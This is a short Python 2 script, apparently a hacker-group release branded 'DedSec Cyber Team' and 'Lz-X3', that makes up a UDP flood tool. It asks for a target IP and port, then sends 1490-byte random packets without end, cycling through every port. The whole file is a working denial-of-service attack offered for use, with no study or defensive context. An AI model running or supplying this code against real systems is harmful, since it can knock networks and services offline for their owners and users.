import os
import sys
import random
import socket
#########
#############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
os.system("figlet Lz-X3")
print
print ("script.ThaiLand")
print ("YouTube Lz-X3")
print ("DedSec Cyber Team")
print
ip = raw_input("IP TARGET : ")
port = input("Port : ")

os.system("clear")
os.system("figlet Londing...")
sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
